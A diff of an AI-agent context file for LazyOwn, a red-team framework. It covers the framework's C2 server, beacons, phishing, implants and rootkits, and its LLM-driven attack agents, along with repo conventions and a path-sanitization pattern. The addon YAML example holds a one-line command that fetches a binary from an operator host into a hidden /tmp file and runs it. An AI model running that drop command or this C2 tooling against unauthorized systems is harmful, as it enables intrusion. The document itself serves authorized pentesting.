@@ -2,21 +2,77 @@
 
 Durable context for any Claude/agent touching this repo. Source of truth: `lazyown.py`, `lazyc2.py`, `utils.py`, `payload.json`, `skills/`, `modules/`, `templates/`.
 
-> **Size budget:** keep this file ≤ 40 KB. Beyond that the prompt cache stops paying off and every assistant invocation pays a tax. `tests/test_claudemd_size.py` enforces the cap; if you need to add a section, trim or move long-form content into a `<dir>/README.md` and link to it from here.
+> **Role-routed context:** `AGENTS.md` is the entry point for an agent that
+> modifies this repository. `CORE.md` is the entry point for an agent that
+> consumes LazyOwn as a dependency. This file is the shared contract both
+> reference. Load only the file that matches the role to save context.
 
 ---
 
 ## 0. What LazyOwn is
 
 Professional red-team / pentest framework:
-- **CLI** (`lazyown.py`): cmd2 shell, ~27k LOC, 333+ commands + 200+ aliases, kill-chain coverage.
-- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 84+ routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
+- **CLI** (`lazyown.py`): cmd2 shell, ~4,900 LOC, 837 commands + 130 aliases driven by 67 ``CommandSet`` modules under ``cli/commands/``.
+- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 121 routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
 - **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
-- **Skills** (`skills/`): MCP server (~131 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.
-- **Extensions**: `lazyaddons/*.yaml` (declarative tools), `plugins/*.lua` (lupa), `tools/*.tool` (pwntomate auto-jobs).
-- **lazyaddons**: `lazyaddons/*.yaml` — extendthe framework with yamls.
+- **Skills** (`skills/`): MCP server (176 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.
 
-MCP sits on top and exposes `lazyown_*` tools to Claude Code.
+## 0.1 Security contracts
+
+Each security control is a single contract in its own file. Full specs in `docs/SECURITY_CONTRACTS.md`.
+
+The contract index, per-file specs, and the hardening sprint history (v1 to
+v5, including the CodeQL batch) live in `docs/SECURITY_CONTRACTS.md`.
+`scripts/check_contract_manifest.py` fails CI when the index drifts from the
+files on disk. Run the hardening suites with:
+
+```sh
+pytest tests/test_security_hardening*.py -v
+```
+
+`mutmut run` gates the runtime hardening primitives.
+
+## 0.2 Non-negotiable: user input is hostile
+
+**Every byte of user-controlled input MUST be treated as malicious — no exceptions, ever.**
+
+This is not a guideline. It is the single most important security rule in this codebase.
+
+| Rule | What it means |
+|------|---------------|
+| Never trust user input | Every `request.args`, `request.form`, `request.json`, `request.headers`, `request.cookies`, route parameter, `sys.argv`, `input()`, file upload name, and any other external input is assumed to be a deliberate attack until proven otherwise. |
+| Sanitize before use | User input must be sanitized *before* it touches any filesystem path, SQL query, shell command, system call, template render, or serialization. No exceptions, not even for "internal" or "trusted" endpoints. |
+| Path traversal is the #1 vector | Any user input that ends up in `os.path.join`, `open()`, or any filesystem operation MUST go through a whitelist character filter AND an `os.path.realpath` prefix check against an explicit allowed directory. Even a single character of uncontrolled path input is unacceptable. |
+| Defense in depth | A sanitization function is not enough. Always add a second layer: `os.path.realpath()` + `.startswith(allowed_dir + os.sep)` before any file I/O. If the path does not resolve within the allowed directory, reject with 403. |
+| Log and reject | When user input fails validation, log the rejection event and return a generic error. Never reflect the rejected input back to the user (information leak). |
+| CodeQL path-expression alerts are blockers | Any CodeQL "Uncontrolled data used in path expression" alert is a critical security bug and must be fixed before merge. No exceptions, no suppressions. |
+
+### Implementation pattern
+
+```python
+import os
+
+
+def safe_path(user_input: str, allowed_dir: str, prefix: str = "") -> str:
+    sanitized = "".join(c for c in str(user_input) if c.isalnum() or c in "-_.")
+    if not sanitized:
+        raise ValueError("Invalid input")
+    allowed = os.path.realpath(allowed_dir)
+    candidate = os.path.realpath(os.path.join(allowed, f"{prefix}{sanitized}"))
+    if not candidate.startswith(allowed + os.sep):
+        raise PermissionError("Path traversal blocked")
+    return candidate
+```
+
+This pattern MUST be used whenever user input contributes to a filesystem path. Copy-paste it. Do not "improve" it without peer review.
+
+### C2 Transport & Evasion contracts
+
+Each module is a single-file contract for one transport or evasion concern.
+The module and test table lives in `docs/SECURITY_CONTRACTS.md`. Compat:
+PROD fail-fast on missing C2 keys, DEV warn-and-default. AES key is
+`payload.json:aes_key` (64 hex) to `self.aes_key` (bytes) plus
+`self.params['aes_key']` (hex). Lazyaddons use `{{aes_key}}` or `{aes_key}`.
 
 ---
 
@@ -25,7 +81,7 @@ MCP sits on top and exposes `lazyown_*` tools to Claude Code.
 ```sh
 ./run [--no-banner] [-s] [-p sessions/foo.json] [-c 'cmd']   # cmd2 shell
 bash fast_run_as_r00t.sh --no-attach --vpn 1                 # full stack in tmux 'lazyown_sessions'
-claude mcp add lazyown python3 /home/grisun0/LazyOwn/skills/lazyown_mcp.py
+bash scripts/setup_hermes_mcp.sh                           # register MCP, resolves the repo path at runtime
 bash skills/mcp_restart.sh                                   # after editing MCP code
 ```
 
@@ -39,28 +95,29 @@ bash skills/mcp_restart.sh                                   # after editing MCP
 
 | Path | Role |
 |------|------|
-| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; ~280 `do_*`. Single CLI source. |
+| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; CLI skeleton + startup hooks. Commands in ``cli/commands/``. |
 | `lazyc2.py` | Flask + Socket.IO C2, decoy site, phishing bp, dashboard, /pty xterm. |
 | `utils.py` | Shared helpers + `Config`, `VulnerabilityScanner`, `MyServer`, `IP2ASN`. |
 | `payload.json` | **Only** runtime config. Read by every component. |
 | `templates/` | 55+ Jinja2; extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
 | `static/` | CSS/JS (xterm.js, particles.js), icons, `body_report.json`. |
-| `modules/` | 50+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine. |
+| `modules/` | 65+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine, `metasploitable_migrations` (gym setup). |
 | `modules/integrations/` | MISP export, Nuclei, Searchsploit. |
 | `modules/backdoor/` `modules/rootkit/` `modules/win_rootkit/` | C/C++/C# implants & rootkits. |
 | `skills/` | MCP server + autonomous daemon + hive_mind + swan + policy + parquet_db. |
 | `sessions/` | Campaign state — **gitignored**, never delete w/o confirmation. `git add -f` to stage. |
 | `parquets/` | Columnar KBs: GTFOBins, LOLBas, MITRE ATT&CK (6 `.parquet`). |
 | `plugins/` | Lua plugins (lupa). Each `.lua` + `.yaml` metadata. |
-| `lazyaddons/` | 76 YAML tool integrations. Auto-discovered. |
+| `lazyaddons/` | 124 YAML tool integrations. Auto-discovered. |
 | `tools/` | 69 pwntomate `.tool` files; auto-trigger on nmap services. |
 | `external/` `modules_ext/` `vpn/` | **Gitignored**; `git add -f` required. Never commit creds. |
-| `lazyscripts/` `playbooks/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), threat profiles. |
-| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. Zero imports from `lazyown.py`. |
-| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. |
-| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. No framework imports. |
+| `lazyscripts/` `playbooks/` `gyms/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), YAML gym catalogue, threat profiles. |
+| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. `cli/commands/params_ops.py` is the `param` command; `cli/lazy_orchestrator.py` has the Params tab. Zero imports from `lazyown.py`. |
+| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. `infra.py` owns disposable C2 (`infra redirector|deploy|destroy|status`). |
+| `deploy/` | Ephemeral IaC: `redirector/` (cloudflared + Caddy path filter, `C2_HOST`/`C2_PORT` env), `c2/` (local stack, Caddy auto-TLS), `infra/providers/digitalocean/` (droplets + firewall, 4444 pinned to redirector), `range/ad-mini/` (isolated AD lab 172.20.0.0/24). |
+| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. `core/param_registry.py` owns the shared parameter catalog (`params/operator.yaml`). No framework imports. |
 | `scripts/` | Build/maintenance: `build_command_index.py`, `patch_playbook_atomic_ids.py`. |
-| `tests/` | 66 files, ~1860 tests. No mocking of C2 or daemon. |
+| `tests/` | 295 files, ~5940 tests. No mocking of C2 or daemon. Gates: `docs/quality_gates.md` + `tests/run_mutation_*.py`. |
 | `lazyown-docker/` `lazygui/` | Docker + desktop GUI. |
 | `docs/` | GH Pages site — auto-generated by `DEPLOY.sh`, don't edit HTML. |
 | `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`). |
@@ -75,7 +132,7 @@ bash skills/mcp_restart.sh                                   # after editing MCP
 
 Loaded by `core.config.load_payload()`, wrapped by `class Config` (`core/config.py`). Every component reads here. **Nothing hardcoded; nothing duplicated; if reused → goes here.**
 
-Typed shape lives in `core/payload_schema.py` (`SCHEMA`): every well-known key has a `FieldSpec` (kind, default, description, example, sensitive flag, required flag). Use `validate_payload(data)` for non-fatal issue reports, `validate_value(key, value)` for single-field checks and `coerce_value(key, raw)` for safe casts (`"5555"` → `5555` for ports, `"true"` → `True` for bools). Adding a new well-known key means adding the `FieldSpec` here — the wizard, the `assign` command and the readiness report pick it up automatically.
+Typed shape lives in `core/payload_schema.py` (`SCHEMA`): every well-known key has a `FieldSpec` (kind, default, description, example, sensitive/required flags). Use `validate_payload(data)`, `validate_value(key, value)`, `coerce_value(key, raw)`. New keys are picked up automatically by the wizard, `assign` and the readiness report.
 
 Critical keys:
 
@@ -86,15 +143,15 @@ Critical keys:
 | `domain`, `subdomain`, `os_id` | Target context (os_id 1=lin/2=win) |
 | `start_user`, `start_pass` | Initial creds (auto-injected on discovery) |
 | `wordlist`, `usrwordlist`, `dirwordlist`, `dnswordlist`, `iiswordlist` | SecLists paths |
-| `c2_maleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
-| `user_agent_*`, `url_trafic_*` | Malleable C2 profile |
+| `c2_malleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
+| `user_agent_*`, `url_traffic_*` | Malleable C2 profile |
 | `sleep`, `sleep_start` | Beacon jitter + auto-loop bootstrap delay |
 | `api_key` | Groq (used by `report.py`, AI agents) |
 | `enable_telegram_c2`/`discord_c2`/`ia`/`deepseek`/`cloudflare`/`run_in_memory`/`c2_implant_debug`/`c2_debug` | Feature flags |
-| `llm_backend` | LLM selection: `"auto"` (Groq when API key is set, else Ollama), `"groq"`, or `"ollama"` |
-| `llm_model_groq` | Model identifier passed to the Groq API (default `llama-3.3-70b-versatile`) |
-| `llm_model_ollama` | Model identifier passed to the Ollama API (default `deepseek-r1:1.5b`) |
-| `ollama_host` | Base URL of the Ollama daemon (default `http://localhost:11434`) |
+| `llm_backend` | LLM selection: `"auto"` (Groq when API key set, else Ollama), `"groq"`, `"ollama"` |
+| `llm_model_groq` / `llm_model_ollama` | Model IDs (defaults `llama-3.3-70b-versatile` / `deepseek-r1:1.5b`) |
+| `ollama_host` | Ollama base URL (default `http://localhost:11434`) |
+| `llm_daily_budget_usd` / `llm_per_call_token_cap` / `llm_budget_enabled` / `llm_reset_at_utc` / `llm_model_prices` | Budget proxy caps and ledger (`1.0` / `8000` / `true` / `00:00` / USD-per-MTok table) |
 | `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit` | flask-limiter strings |
 | `targets` | Multi-target list (status, ports, tags, notes) |
 | `scope` | Authorized engagement scope: list of CIDR/IP/hostname entries (`*.` wildcards). Empty = scope guard dormant |
@@ -169,23 +226,19 @@ Every interactive command flows through `LazyOwnShell.onecmd_plus_hooks`, which 
 - `app = Flask(__name__, static_folder='static')` (~line 1610).
 - `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`; namespaces `/listener`, `/pty`, `/terminal`.
 - `flask-limiter` from `c2_daily_limit`/`c2_hour_limit`/`c2_login_limit`.
-- 84 routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_maleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
-- Blueprints: `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
+- 80+ routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_maleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
+- Blueprints: `operations_bp`, `auth_bp`, `addons_bp` (LazyAddon creator, `/addons`), `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
 - **Blueprint config pattern**: `lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` before `register_blueprint`. Blueprint reads via `current_app.config.get("LAZYOWN_CONFIG")` — do NOT pass module globals.
 - Auth: HTTP Basic via `requires_auth` (uses `c2_user`/`c2_pass`) + `flask-login` for operator UI.
 - DNS server: `dnslib` resolver in daemon thread.
 - Watcher: `watchdog.Observer` reading `event_config.json`.
 
 ### Adding a route — happy path
-1. Decide operator-only (`@requires_auth`) vs beacon-facing (apply both canonical path AND `f'{route_maleable}<...>'` alias).
+1. Decide operator-only (`@requires_auth`) vs beacon-facing (apply both canonical path AND `f'{route_malleable}<...>'` alias).
 2. `render_template('foo.html', ctx=...)` — typed context, not raw request data.
-3. Validate paths/templates with `validate_route_path` + `validate_template_name` + `is_safe_template_path`. Never bypass. The canonical implementations live in `lazyc2/security/validators.py` (return `(bool, str)` tuples). Module-level shims in `lazyc2.py` wrap them as booleans for legacy callers — new code must consume the tuple form so the error string can be surfaced to the operator.
-4. Persist via existing helpers:
-   - JSON: `load_routes`/`save_routes`, `load_short_urls`, etc. — atomic (`*.tmp` → `os.rename`, chmod 600).
-   - SQLite: `sqlite3.connect(DB_PATH)` inside `with` blocks.
-5. Log to `sessions/access.log` via `logger = logging.getLogger(__name__)`.
-6. Reuse existing Socket.IO namespaces.
-7. New Jinja2 → `templates/`, extend `base.html`, reuse `header.html`/`nav.html`/`footer.html`.
+3. Validate paths/templates with `validate_route_path` + `validate_template_name` + `is_safe_template_path`. Never bypass. Canonical implementations live in `lazyc2/security/validators.py` (return `(bool, str)` tuples); legacy boolean shims exist in `lazyc2.py` — new code must consume the tuple form.
+4. Persist via existing helpers: JSON (`load_routes`/`save_routes`, atomic `*.tmp` → `os.rename`) or SQLite (`sqlite3.connect(DB_PATH)` inside `with` blocks).
+5. New Jinja2 → `templates/`, extend `base.html`.
 
 ### Sad paths
 - Path traversal → always `is_safe_template_path` first; reject paths escaping `templates/`.
@@ -231,7 +284,7 @@ New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/
 
 ## 8. MCP — `skills/lazyown_mcp.py`
 
-~131 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.
+~154 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.
 
 ### Adding a tool — happy path
 1. Functionality must exist as `do_*` / utils helper / C2 endpoint first.
@@ -278,38 +331,13 @@ Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exis
 
 ## 10. Coding standards (enforced by review)
 
-1. **English only.** Identifiers, strings, logs, docstrings. Translate Spanish remnants when you touch them.
-2. **No comments.** Self-explanatory names + docstrings. Single-line note OK for non-obvious constraint or CVE ref.
-3. **No emojis** in code/logs/docs unless operator asked. Banner ASCII art OK.
-4. **Docstrings on every public function/class**:
-   ```python
-   def foo(bar: str) -> dict:
-       """One-line summary.
+Moved to `docs/coding_standards.md`. Non-negotiables at a glance:
+English only, no comments, no emojis, docstrings on public symbols,
+no magic numbers, no hardcoded paths/creds, SOLID, boy-scout law,
+smart consolidation (DRY), tests trend to 100%, docs follow code.
+The full 15-point contract, including happy-path examples, lives in
+the external document.
 
-       Args:
-           bar: …
-       Returns:
-           …
-       Raises:
-           …
-       """
-   ```
-5. **No magic numbers** — constants in `class Config` (shared) or `UPPER_SNAKE_CASE` module-level.
-6. **No hardcoded paths/ports/IPs/wordlists/creds** — `payload.json` if reused, module constant if local.
-7. **SOLID**:
-   - **S**: one reason to change per class/fn.
-   - **O**: extend via new addon/MCP tool/selector — don't edit hot paths.
-   - **L**: new selector honours `BaseSelector.suggest()` contract.
-   - **I**: small role-specific protocols (recon/exploit/cred/lateral/privesc).
-   - **D**: orchestration depends on `LLMBackend`/`MemoryStore`/`Selector` abstractions, not Groq/ChromaDB directly.
-8. **Consistency beats novelty** — when two patterns fit, pick the one already used.
-9. **No partial implementations** — end-to-end (CLI ↔ payload.json ↔ MCP ↔ `sessions/` artefact) or not merged.
-10. **No backwards-compat shims** for unshipped code — just change it.
-11. **Every new directory gets a README** (see §2 rules). No exceptions.
-12. **Boy-scout law (tech debt).** When a fix / refactor / new feature uncovers tech debt or a vulnerability that can be addressed **without breaking public surface or shipped behaviour**, address it in the same change and call it out in the PR body. Plan with `/graphify` first so the blast radius is understood — never refactor blindly. If the cleanup is unsafe within the change, open a follow-up task; do **not** silently leave the broken window.
-13. **Smart consolidation (DRY+SOLID).** When two or more code paths duplicate logic (~10 LOC or one decision tree), consolidate into a single class/function honouring SOLID. Shared values go to `class Config` / `payload.json` if globally reused, module-level `UPPER_SNAKE_CASE` if local. Refactor must keep every existing call site working and ship with tests that pin behaviour **before** the move. No silent simplifications — feature parity is mandatory.
-14. **Tests trend to 100%.** Every change ships with tests. If a touched module gains testable code, the change must raise coverage, not lower it. `pytest -q` must stay green. No `skip` / `xfail` without an issue link in the same PR.
-15. **Docs follow code.** When a public surface (CLI verb, MCP tool, payload key, blueprint route, addon schema) is added or renamed, update the matching `docs/<topic>.md` and regenerate `COMMANDS.md` / `UTILS.md` via `python3 readmeneitor.py lazyown.py` and `python3 readmeneitor.py utils.py`. Missing or empty docstrings on new public API block merge. Extend `readmeneitor.py` itself when a new source file deserves auto-generated reference docs.
 
 ---
 
@@ -344,7 +372,7 @@ When invoking Claude/Groq/Ollama (`lazyown_llm_ask`, `swan_run`, `hive_spawn`, `
    - Top-3 pivot candidates (`world_model.NetworkGraph.centrality()`).
    - Active objective (`objectives.jsonl`).
    - Relevant captured creds.
-3. **Tool catalogue** — filter bridge catalog to current phase + OS, never all 347 commands.
+3. **Tool catalogue** — filter bridge catalog to current phase + OS, never all 363 commands.
 4. **Output contract** — request `{"command": "...", "reasoning": "...", "mitre": "Txxx"}`. Reject prose.
 5. **Reward shaping** — Detection Oracle + OutcomeEvaluator score each step → propagated to RL Q-table + MoE weights. New selectors emit reward `∈ [0, 1]`.
 
@@ -428,24 +456,15 @@ Self-knowledge graph at `graphify-out/graph_lazyown.json`. Built by `/graphify`.
 
 ## 15b. Operator UX
 
-### Inline reactive hints — `cli/reactive_hints.py`
-`register_postcmd_hook` prints one dim line after each `do_*`:
-```
-  ↳ do_gobuster · do_enum4linux · do_ffuf
-```
-- Suggestions from `GraphAdvisor.suggest_next()`.
-- `SKIP_COMMANDS` (help/exit/dashboard/set/palette/…) never produce hints.
-- Toggle: `enable_inline_hints` in `payload.json` (default `true`).
-- Missing graph → no-op. Latency < 1 ms after first load.
-- Public surface: `render_inline_hints(advisor, last_command, limit, enabled)`. Output via `rich.console.Console`. Hook returns `data` unchanged (cmd2 passes `PostcommandData` by reference).
+Inline reactive hints (`cli/reactive_hints.py`) and the Textual dashboard
+(`cli/dashboard_tui.py`) are documented in `cli/README.md`. Hints print one
+dim line per command, skip the `SKIP_COMMANDS` verbs, honour
+`enable_inline_hints` (payload.json), and degrade to a no-op without a
+graph. Dashboard entry: `launch(payload_path, sessions_dir)`.
 
-### Dashboard TUI — `cli/dashboard_tui.py`
-`dashboard` cmd launches Textual app (blocking, **Q** quits). `LazyOwnDashboard(App)` accepts `payload_path` + `sessions_dir`. Widgets: `TargetPanel` → `KillChainPanel` + `ConfigPanel` → `CommandsPanel` → `OpsPanel` → `HintBar`. `_do_refresh()` on mount + every `REFRESH_INTERVAL` (5s) via `set_interval`. Entry: `launch(payload_path, sessions_dir)`. Requires `pip install textual`.
+### Usability contracts
 
-Pure helpers (tested independently): `_read_json`, `_read_recent_commands`, `_count_lines_in_glob`, `_beacon_count`, `_graph_hints`.
-
----
-
+Full contracts live in `cli/README.md` (coaching levels `ui_hints`, `cli/phase_labels.py`, `scripts/sync_doc_stats.py` doc counts, index hygiene). Mutation gate: `tests/run_mutation_ux_usability.py`.
 
 ### Addon YAML pattern
 ```yaml
@@ -456,120 +475,176 @@ tool:
   execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
   lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
 ```
-Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. `os` defaults to `any`, `trigger` to `[]` — fill them so `explore`/`recommend_next`/`suggest_next` can surface the addon against discovered services.
-
-Tests: `tests/test_blacksandbeacon_addon.py` (59 tests — YAML structure, required fields, path safety, template placeholders, no hardcoded IPs/ports).
+Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. Fill `os`/`trigger` so `explore`/`recommend_next` surface the addon. Tests: `tests/test_blacksandbeacon_addon.py` (59).
 
 ---
 
 ## 15d. Multi-operator collaboration — `collab_bp`
 
-`modules/collab_bp.py` — Flask blueprint, real-time team server. Auto-activates on `lazyc2.py` start.
-
-| Class | Responsibility |
-|-------|----------------|
-| `EventBus` | In-process SSE pub/sub; per-subscriber `Queue`; replays last 20 on join |
-| `LockManager` | Advisory per-target locks w/ TTL; prevents two operators on same host |
-| `OperatorRegistry` | Tracks operators; > 90 s no heartbeat → inactive |
-| `ColabEvent` | Value object: `type`, `payload`, `operator`, `ts`, `id` |
-
-Module singletons (`_bus`, `_locks`, `_registry`) injected via closure. Broadcast:
-```python
-from collab_bp import publish_event
-publish_event(type="finding", payload={"target": "...", "detail": "..."}, operator="alice")
-```
-
-| Endpoint | Method | Description |
-|---|---|---|
-| `/collab/` | GET | Browser dashboard (`templates/collab.html`) |
-| `/collab/stream?operator=<name>` | GET (SSE) | Real-time events; keepalive 15s |
-| `/collab/operators` | GET | Active operators |
-| `/collab/publish` | POST | Broadcast event (type, payload, operator) |
-| `/collab/lock` | POST | Acquire target lock (target, operator, ttl_secs) |
-| `/collab/unlock` | POST | Release lock |
-| `/collab/locks` | GET | Active locks w/ TTL |
-| `/collab/history?n=N` | GET | Last N events (max 500) |
-
-`templates/collab.html`: extends `base.html`. Operator presence, lock UI, SSE feed, chat, copyable join URL. Reads `c2_host`/`join_url` from Flask context — no hardcoded IPs.
-
-**LAZYOWN_CONFIG injection**:
-```python
-cfg = current_app.config.get("LAZYOWN_CONFIG", {})
-lhost = cfg.get("lhost", "localhost") if hasattr(cfg, "get") else getattr(cfg, "lhost", "localhost")
-```
-The `hasattr` guard handles both `dict` (tests) and `Config` (prod). **Canonical pattern for blueprints needing payload values.** Don't import `config` from `lazyc2.py`.
-
-**`do_collab_join` CLI** (category 10 C&C):
-```
-collab_join [handle] [--curl]
-```
-Reads `lhost`/`c2_port` from `self.params`. Prints dashboard URL, SSE URL, REST endpoints. `--curl` adds `curl --insecure -N` snippet.
-
-Tests: `tests/test_collab_and_onboarding.py` (67 — bus/locks/registry, all 8 HTTP endpoints, template content, `QUICKSTART.md`, wizard DIP, CLI cmd).
-
----
+`modules/collab_bp.py`: `EventBus` (SSE, replay 20), `LockManager` (per-target TTL locks), `OperatorRegistry` (90s heartbeat), `ColabEvent`. Endpoints: `/collab/`, `/collab/stream`, `/operators`, `/publish`, `/lock`, `/unlock`, `/history`. Tests: `tests/test_collab_and_onboarding.py`.
 
 ## 15e. Onboarding — `QUICKSTART.md` + `wizard`
 
-`QUICKSTART.md`: canonical operator onboarding. **Manual** — update when flow changes. Sections: prereqs → clone + `bash install.sh` → `wizard` (7 steps: rhost, lhost, domain, device, os_id, api_key, wordlists) → recon (`ping` → `lazynmap` → `auto_populate` → `facts_show`) → C2 (`fast_run_as_r00t.sh` or `lazyc2`) → first shell (Go beacon or `blacksandbeacon`) → `collab_join` → command/files reference + troubleshooting.
+`QUICKSTART.md` is canonical onboarding (update when flow changes). `cli/wizard.py` never imports `lazyown.py`/`lazyc2.py`; takes `params` + `save`, auto-detects `lhost`. Run `wizard` / `wizard --check`; auto-launches on first run when `rhost` unset.
 
-`cli/wizard.py`: **never** imports `lazyown.py`/`lazyc2.py` (DIP). Takes `params: dict` + `save: Callable` — doesn't touch `payload.json` directly. Output via `rich`. Auto-detects `lhost` from routing table, SecLists from candidate dirs. Run: `wizard` or `wizard --check`. Auto-launched on first run when `rhost` unset.
+## 15f. Release — `DEPLOY.sh`
 
----
-
-## 15f. Release pipeline — `DEPLOY.sh`
-
-`DEPLOY.sh` (repo root, not `./DEPLOY`):
-1. Rebuilds `README.md` from `UTILS.md` + `COMMANDS.md` + `CHANGELOG.md`.
-2. Regenerates `docs/index.html`.
-3. Prompts: commit type, typedesc, subject, body.
-4. Bumps `version.json`.
-5. Signed git commit + tag (`release/0.x.y`).
-6. Pushes `origin/main` + creates GH release.
-
-Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`
-
-Type → bump: `feat/feature/fix/hotfix` = patch; `refactor/docs/test/style` = none; `release` = major; `patch` = minor.
-
-`--no-test` skips tests — only when verified separately.
-
-**Does NOT**: run pytest; validate `CLAUDE.md`. `CHANGELOG.md` truncated to 120k chars in GH release body; full in file.
-
----
+Rebuilds `README.md` + `docs/index.html`, bumps `version.json`, signed tag + GH release. Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`.
 
 ## 15g. Branching strategy (law)
 
-LazyOwn uses a three-branch model to separate development, pre-production and production. This is **law**, not preference. Direct commits to `pp` or `main` are rejected at review.
+Three-branch model: `dev` (active), `pp` (staging/QA), `main` (release). Flow: `feature/*` → `dev` → `pp` → `main`. Hotfix: branch from `main`, PR to `main`, back-merge to `pp` and `dev`. Agents work on `dev`.
 
-| Branch | Purpose | Who merges into it |
-|--------|---------|-------------------|
-| `dev`  | Active development, feature integration, daily commits. | Feature branches (via PR) |
-| `pp`   | Pre-production / staging. Stable enough for QA and integration tests. | `dev` (fast-forward or merge commit after QA) |
-| `main` | Production releases. Only tested, tagged releases live here. | `pp` (via PR with release notes) |
+Mandatory sync before touching `dev` (`main` moves fast; stale `dev`
+silently drops commits). With a clean tree (stash if dirty):
 
-### Rules
+```sh
+git fetch origin main dev && git checkout dev
+git merge --ff-only origin/main || git merge --no-edit origin/main
+```
 
-- **Never commit directly to `main` or `pp`.** All work starts in `dev` or a feature branch cut from `dev`.
-- **Release flow**: `feature/*` -> `dev` -> `pp` -> `main`.
-- **Hotfix flow**: branch from `main`, fix, PR to `main`, then back-merge to `pp` and `dev`.
-- **Agent autonomy**: Autonomous agents (Claude, Groq, SWAN) operate on `dev`. Human operator approves promotion to `pp`.
-- **Tagging**: Only `main` receives version tags (`release/0.x.y`).
+`git merge-base --is-ancestor origin/main HEAD` must pass and
+`git rev-list --count HEAD..origin/main` must print 0. Otherwise STOP.
 
-### CI implications
+## 15h. claude_md_orchestrator skill
 
-`DEPLOY.sh` runs against `main`. If you are on `dev` or `pp`, use `--no-test` only after local pytest passes.
+`skills/claude_md_orchestrator/` implements the SDD+TDD+BDD+Boy Scout
+cycle, resuming from `state.json` after every stage. Invocation and stage
+detail: `skills/claude_md_orchestrator/README.md`. CI hardening is pinned
+by `tests/test_ci_strict.py`.
 
 ---
+
+## 15i. LLM budget cap
+
+`core/llm_budget.py` — daily cost cap + per-call token cap via proxy wrapping. Budget config keys: `llm_daily_budget_usd` (default 1.0), `llm_per_call_token_cap` (8000), `llm_budget_enabled` (true), `llm_reset_at_utc` (00:00), `llm_model_prices` (per-model USD/1M tokens). Persists spend to `sessions/llm_budget.json`. CLI: `llm_budget` / `llm_budget json` / `llm_budget reset`. MCP: `lazyown_get_llm_budget`. Tests: `tests/test_llm_budget.py`.
+
+## 15j. LazyGUI — v2.0 Operator Console (PySide6 Desktop App)
+
+Architecture, backend communication contracts, and domain models:
+`lazygui/README.md`. Core panels: Topology, Sessions, Listeners, KillChain,
+Collaboration. Backend over the authenticated HTTP API (`/api/*`).
+
+## 15k. LazyAddon Creator contract (C2 guided form)
+
+Guided `/addons` pages author `lazyaddons/*.yaml` without hand-editing
+YAML: one form covers every addon option with tooltips, placeholders,
+per-field help, and drag-and-drop placeholder chips. Full spec,
+security invariants, and routes: `lazyc2/README.md`.
+
+| File | Role |
+|------|------|
+| `lazyc2/addon_creator.py` | Single-file contract (config, draft, validator, renderer, store, parser) |
+| `lazyc2/blueprints/addons.py` | `/addons` list, create, view, delete blueprint; CSRF on every mutation |
+| `templates/addon_creator.html` + `addons.html` + `addon_view.html` | Form, list, and YAML preview |
+| `tests/test_addon_creator.py` | 71 TDD+BDD tests |
+| `tests/run_mutation_addon_creator.py` | Mutation gate: 10 mutants, all killed |
+
+DoD gate: `pytest tests/test_addon_creator.py` green, mutation runner
+reports `10 killed, 0 survived`. Wired in the `lazyc2.py` blueprint try
+block; nav entry next to Tools in `templates/base.html`.
+
+---
+
+## 15l. Autonomous loop contracts
+
